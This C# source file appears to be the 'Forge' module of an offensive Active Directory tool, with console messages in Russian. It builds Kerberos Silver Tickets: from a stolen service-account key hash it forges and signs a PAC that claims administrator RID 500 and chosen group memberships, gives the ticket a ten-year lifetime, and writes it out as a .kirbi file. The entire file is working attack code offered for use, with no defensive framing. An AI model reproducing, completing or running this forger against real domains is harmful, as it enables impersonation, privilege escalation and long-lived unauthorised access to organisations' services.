using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Formats.Asn1;
using System.Security.Cryptography;
using Kerberos.NET.Entities;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities.Pac;
using KPacSid = Kerberos.NET.Entities.Pac.SecurityIdentifier;

namespace krbengine
{
    public class TicketForgeEngine
    {
        public static async Task RunAsync(Dictionary<string, string> opt)
        {
            try
            {
                string domain = opt["-d"];
                string user = opt["-u"];
                string spn = opt["-spn"];
                string sidInput = opt["-sid"];

                uint primaryGroupId = opt.ContainsKey("-primary") ? uint.Parse(opt["-primary"]) : 513;
                List<uint> groupRids = opt.ContainsKey("-groups")
                    ? ParseGroupRids(opt["-groups"])
                    : new List<uint> { 513 };

                uint rid = opt.ContainsKey("-rid") ? uint.Parse(opt["-rid"]) : 500;
                byte[] serviceKey = Convert.FromHexString(opt["-hash"].Replace("-", "").Replace(" ", ""));
                string outputPath = opt.GetValueOrDefault("-out", "silver.kirbi");
                uint kvno = opt.ContainsKey("-kvno") ? uint.Parse(opt["-kvno"]) : 0;

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[*] ЗАПУСК МОДУЛЯ: FORGE");
                Console.WriteLine($"    Domain: {domain} | User: {user} | Target: {spn}");
                Console.ResetColor();

                await GenerateSilverTicket(user, domain, spn, serviceKey, sidInput, rid, outputPath, kvno, primaryGroupId, groupRids);
                Console.WriteLine("\n[*] Модуль Forge завершил работу.");
            }
            catch (Exception ex)
            {
                Fail("СБОЙ МОДУЛЯ FORGE");
                Console.WriteLine(ex);
                Console.ResetColor();
            }
        }

        // Сборка PAC, шифрование EncTicketPart и сохранение результата в файл
        private static async Task GenerateSilverTicket(string user, string domain, string spn, byte[] serviceKeyBytes, string sidInput, uint rid, string outputPath, uint kvno, uint primaryGroupId, List<uint> groupRids)
        {
            var etype = serviceKeyBytes.Length == 16
                ? EncryptionType.RC4_HMAC_NT
                : EncryptionType.AES256_CTS_HMAC_SHA1_96;

            int sigAlg = etype == EncryptionType.AES256_CTS_HMAC_SHA1_96 ? 16 : -138;
            int sigLen = sigAlg == 16 ? 12 : 16;

            Step("Подготовка параметров билета...");
            KeyValue("Encryption", GetETypeName(etype));
            KeyValue("KVNO", kvno.ToString());
            KeyValue("Domain SID", sidInput);
            KeyValue("User RID", rid.ToString());
            KeyValue("Primary Group", primaryGroupId.ToString());
            KeyValue("Groups", string.Join(",", groupRids.Distinct()));
            KeyValue("Output", outputPath);
            Console.WriteLine();

            var nowUtc = DateTimeOffset.UtcNow;
            var now = new DateTimeOffset(
                nowUtc.Year,
                nowUtc.Month,
                nowUtc.Day,
                nowUtc.Hour,
                nowUtc.Minute,
                nowUtc.Second,
                TimeSpan.Zero
            );

            string upperDomain = domain.ToUpperInvariant();
            var domainSid = ParseSidManual(sidInput);
            var userSid = ParseSidManual(sidInput + "-" + rid);
            var serviceKey = new KerberosKey(serviceKeyBytes, etype: etype);
            var trans = CryptoService.CreateTransform(etype);
            var serviceName = new KrbPrincipalName
            {
                Type = PrincipalNameType.NT_PRINCIPAL,
                Name = spn.Split('/')
            };

            KrbEncryptionKey sessionKey;

            if (etype == EncryptionType.RC4_HMAC_NT)
            {
                byte[] randomRc4Key = new byte[16];
                RandomNumberGenerator.Fill(randomRc4Key);
                sessionKey = new KrbEncryptionKey
                {
                    EType = etype,
                    KeyValue = randomRc4Key
                };
            }
            else
            {
                sessionKey = KrbEncryptionKey.Generate(etype);
            }

            Step("Формирование PAC_LOGON_INFO...");

            var logonInfo = new PacLogonInfo
            {
                UserName = user,
                DomainName = upperDomain,
                DomainSid = domainSid,

                UserId = rid,
                GroupId = primaryGroupId,
                GroupIds = groupRids
                    .Distinct()
                    .Select(groupRid => new GroupMembership
                    {
                        RelativeId = groupRid,
                        Attributes = (SidAttributes)7
                    })
                    .ToList(),

                LogonTime = now,
                LogoffTime = DateTimeOffset.MinValue,
                KickOffTime = DateTimeOffset.MinValue,

                PwdLastChangeTime = now,
                PwdCanChangeTime = DateTimeOffset.MinValue,
                PwdMustChangeTime = DateTimeOffset.MinValue,

                UserAccountControl = (UserAccountControlFlags)0x00000210,
                UserFlags = 0,
                LastSuccessfulILogon = DateTimeOffset.MinValue,
                LastFailedILogon = DateTimeOffset.MinValue,
                FailedILogonCount = 0,
                SubAuthStatus = 0,
                LogonCount = 500,
                BadPasswordCount = 0
            };

            byte[] logonData = logonInfo.Encode().ToArray();
            Success($"PAC_LOGON_INFO подготовлен ({logonData.Length} байт).");

            byte[] clientData = new PacClientInfo
            {
                Name = user,
                ClientId = now
            }.Encode().ToArray();

            byte[] requestorData = EncodeSidManual(userSid);

            byte[] attributeData =
            {
                0x02, 0x00, 0x00, 0x00,
                0x01, 0x00, 0x00, 0x00
            };

            Console.WriteLine();
            Step("Сборка PAC и подготовка подписей...");

            byte[] pacInit = BuildStrictPacLayout(
                logonData,
                clientData,
                requestorData,
                attributeData,
                sigAlg,
                sigLen,
                null,
                null
            );
            byte[] srvSigBytes;
            byte[] kdcSigBytes;

            if (etype == EncryptionType.RC4_HMAC_NT)
            {
                srvSigBytes = KerbChecksumRc4Pac(serviceKeyBytes, pacInit);
                kdcSigBytes = KerbChecksumRc4Pac(serviceKeyBytes, srvSigBytes);
            }
            else
            {
                srvSigBytes = trans.MakeChecksum(
                    pacInit,
                    serviceKey,
                    (KeyUsage)17,
                    KeyDerivationMode.Kc,
                    sigLen
                ).ToArray();

                kdcSigBytes = trans.MakeChecksum(
                    srvSigBytes,
                    serviceKey,
                    (KeyUsage)17,
                    KeyDerivationMode.Kc,
                    sigLen
                ).ToArray();
            }

            byte[] finalPac = BuildStrictPacLayout(
                logonData,
                clientData,
                requestorData,
                attributeData,
                sigAlg,
                sigLen,
                srvSigBytes,
                kdcSigBytes
            );

            PrintPacSummary(
                logonData.Length,
                clientData.Length,
                attributeData.Length,
                requestorData.Length,
                4 + sigLen,
                4 + sigLen,
                finalPac.Length
            );

            Console.WriteLine();
            Step("Формирование EncTicketPart...");

            var ticketFlags = (TicketFlags)0x50A00000;
            var ticketPart = new KrbEncTicketPart
            {
                Flags = ticketFlags,
                CName = new KrbPrincipalName
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = new[] { user }
                },
                CRealm = upperDomain,
                Transited = new KrbTransitedEncoding
                {
                    Type = 0,
                    Contents = ReadOnlyMemory<byte>.Empty
                },
                AuthTime = now,
                StartTime = now,
                EndTime = now.AddYears(10),
                RenewTill = now.AddYears(10),
                Key = sessionKey,
                AuthorizationData = new[]
                {
                    new KrbAuthorizationData
                    {
                        Type = AuthorizationDataType.AdIfRelevant,
                        Data = WrapPacForWindows(finalPac)
                    }
                }
            };

            byte[] ticketBodyBytes = ticketPart.EncodeApplication().ToArray();
            byte[] finalEnc = trans.Encrypt(
                ticketBodyBytes,
                serviceKey,
                (KeyUsage)2
            ).ToArray();
            Success($"EncTicketPart зашифрован ({finalEnc.Length} байт).");

            var cred = new KrbCred
            {
                Tickets = new[]
                {
                    new KrbTicket
                    {
                        Realm = upperDomain,
                        SName = serviceName,

                        EncryptedPart = new KrbEncryptedData
                        {
                            EType = etype,
                            KeyVersionNumber = (int?)kvno,
                            Cipher = finalEnc
                        }
                    }
                },

                EncryptedPart = new KrbEncryptedData
                {
                    EType = EncryptionType.NULL,
                    Cipher = new KrbEncKrbCredPart
                    {
                        TicketInfo = new[]
                        {
                            new KrbCredInfo
                            {
                                Key = sessionKey,
                                Realm = upperDomain,
                                PName = ticketPart.CName,
                                SRealm = upperDomain,
                                SName = serviceName,
                                Flags = ticketPart.Flags,
                                AuthTime = now,
                                StartTime = now,
                                EndTime = ticketPart.EndTime,
                                RenewTill = ticketPart.RenewTill
                            }
                        }
                    }.EncodeApplication().ToArray()
                }
            };

            await File.WriteAllBytesAsync(outputPath, cred.EncodeApplication().ToArray());

            Console.WriteLine();
            Success("Silver Ticket успешно сформирован.");
            KeyValue("Файл", outputPath);
            KeyValue("Client", $"{user} @ {upperDomain}");
            KeyValue("Service", $"{spn} @ {upperDomain}");
            KeyValue("EType", GetETypeName(etype));
            KeyValue("PAC", $"{finalPac.Length} байт");
        }

        // Кодирование SID в бинарный RPC SID для PAC_REQUESTOR
        private static byte[] EncodeSidManual(KPacSid sid)
        {
            var rpcSid = sid.ToRpcSid();
            using var ms = new MemoryStream();
            using var writer = new BinaryWriter(ms);

            writer.Write(rpcSid.Revision);
            writer.Write(rpcSid.SubAuthorityCount);
            writer.Write(rpcSid.IdentifierAuthority.IdentifierAuthority.ToArray());

            var subAuthorities = rpcSid.SubAuthority.ToArray();
            foreach (var sub in subAuthorities)
            {
                writer.Write(sub);
            }

            return ms.ToArray();
        }

        // Сборка PAC-буферов и таблицу PAC_INFO_BUFFER с 8-байтным выравниванием
        private static byte[] BuildStrictPacLayout(byte[] logon, byte[] client, byte[] requestor, byte[] attrs, int sigAlg, int sigLen, byte[] srv, byte[] kdc)
        {
            var blocks = new List<(int type, byte[] data)>
            {
                (1, logon),
                (10, client),
                (17, attrs),
                (18, requestor),
                (6, FormatSig(sigAlg, sigLen, srv)),
                (7, FormatSig(sigAlg, sigLen, kdc))
            };

            int currentPos = 8 + (blocks.Count * 16);
            var table = new List<(int type, byte[] data, int offset)>();

            foreach (var b in blocks)
            {
                currentPos = Align8(currentPos);

                table.Add((b.type, b.data, currentPos));
                currentPos += b.data.Length;
            }

            using var ms = new MemoryStream();
            using var writer = new BinaryWriter(ms);

            writer.Write(blocks.Count);
            writer.Write(0);

            foreach (var t in table)
            {
                writer.Write(t.type);
                writer.Write(t.data.Length);
                writer.Write((long)t.offset);
            }

            int bytesWritten = 8 + (blocks.Count * 16);

            foreach (var t in table)
            {
                while (bytesWritten < t.offset)
                {
                    writer.Write((byte)0x00);
                    bytesWritten++;
                }

                writer.Write(t.data);
                bytesWritten += t.data.Length;
            }

            while (bytesWritten % 8 != 0)
            {
                writer.Write((byte)0x00);
                bytesWritten++;
            }


            return ms.ToArray();
        }

        private static int Align8(int value)
        {
            return (value + 7) & ~7;
        }

        // Формирование буфер подписи PAC
        private static byte[] FormatSig(int type, int sigLen, byte[] sig)
        {
            byte[] buf = new byte[4 + sigLen];

            BitConverter.GetBytes(type).CopyTo(buf, 0);

            if (sig != null)
            {
                Buffer.BlockCopy(sig, 0, buf, 4, sigLen);
            }

            return buf;
        }

        // Оборачивание PAC в AD_IF_RELEVANT/AD_WIN2K_PAC для поля AuthorizationData
        private static byte[] WrapPacForWindows(byte[] pacBytes)
        {
            var writer = new AsnWriter(AsnEncodingRules.DER);

            writer.PushSequence();
            writer.PushSequence();
            writer.PushSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
            writer.WriteInteger(128);
            writer.PopSequence(new Asn1Tag(TagClass.ContextSpecific, 0));
            writer.PushSequence(new Asn1Tag(TagClass.ContextSpecific, 1));
            writer.WriteOctetString(pacBytes);
            writer.PopSequence(new Asn1Tag(TagClass.ContextSpecific, 1));
            writer.PopSequence();
            writer.PopSequence();

            return writer.Encode();
        }

        // Преобразование строкового SID в объект Kerberos.NET
        private static KPacSid ParseSidManual(string sidString)
        {
            var parts = sidString.Trim().Split('-');
            uint[] subs = new uint[parts.Length - 3];

            for (int i = 0; i < subs.Length; i++)
            {
                subs[i] = uint.Parse(parts[i + 3]);
            }

            return new KPacSid(
                (IdentifierAuthority)long.Parse(parts[2]),
                subs,
                SidAttributes.SE_GROUP_ENABLED
            );
        }

        // Рассчитывание PAC checksum для RC4-HMAC
        private static byte[] KerbChecksumRc4Pac(byte[] key, byte[] data)
        {
            byte[] signatureKeyBytes = Encoding.ASCII.GetBytes("signaturekey\0");
            byte[] kSign;
            using (var hmac = new HMACMD5(key))
            {
                kSign = hmac.ComputeHash(signatureKeyBytes);
            }

            byte[] usageBytes = BitConverter.GetBytes(17);
            byte[] md5Input = new byte[usageBytes.Length + data.Length];

            Buffer.BlockCopy(usageBytes, 0, md5Input, 0, usageBytes.Length);
            Buffer.BlockCopy(data, 0, md5Input, usageBytes.Length, data.Length);

            byte[] inner;
            using (var md5 = MD5.Create())
            {
                inner = md5.ComputeHash(md5Input);
            }

            using (var hmac = new HMACMD5(kSign))
            {
                return hmac.ComputeHash(inner);
            }
        }

        // Разбор списока групп из параметра groups.
        private static List<uint> ParseGroupRids(string value)
        {
            if (string.IsNullOrWhiteSpace(value))
            {
                return new List<uint> { 513 };
            }

            return value
                .Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries)
                .Select(x => uint.Parse(x))
                .Distinct()
                .ToList();
        }

        private static void Step(string message)
        {
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine($"[*] {message}");
            Console.ResetColor();
        }

        private static void Success(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"[+] {message}");
            Console.ResetColor();
        }

        private static void Fail(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[!] {message}");
            Console.ResetColor();
        }

        private static void KeyValue(string key, string value)
        {
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.Write($"    {key,-14}: ");
            Console.ResetColor();
            Console.WriteLine(value);
        }


        private static string GetETypeName(EncryptionType etype)
        {
            return etype switch
            {
                EncryptionType.RC4_HMAC_NT => "RC4-HMAC",
                EncryptionType.AES256_CTS_HMAC_SHA1_96 => "AES-256-CTS-HMAC-SHA1-96",
                _ => etype.ToString()
            };
        }

        private static void PrintPacSummary(
            int logonLen,
            int clientLen,
            int attrsLen,
            int requestorLen,
            int serverSigLen,
            int kdcSigLen,
            int totalPacLen
        )
        {
            Success("PAC собран и подписан.");

            KeyValue("Buffers", "6");
            KeyValue("LOGON_INFO", $"{logonLen} байт");
            KeyValue("CLIENT_INFO", $"{clientLen} байт");
            KeyValue("ATTRIBUTES", $"{attrsLen} байт");
            KeyValue("REQUESTOR", $"{requestorLen} байт");
            KeyValue("SERVER_SIG", $"{serverSigLen} байт");
            KeyValue("KDC_SIG", $"{kdcSigLen} байт");
            KeyValue("PAC length", $"{totalPacLen} байт");
            KeyValue("Alignment", totalPacLen % 8 == 0 ? "8-byte OK" : "WARNING");
        }
    }
}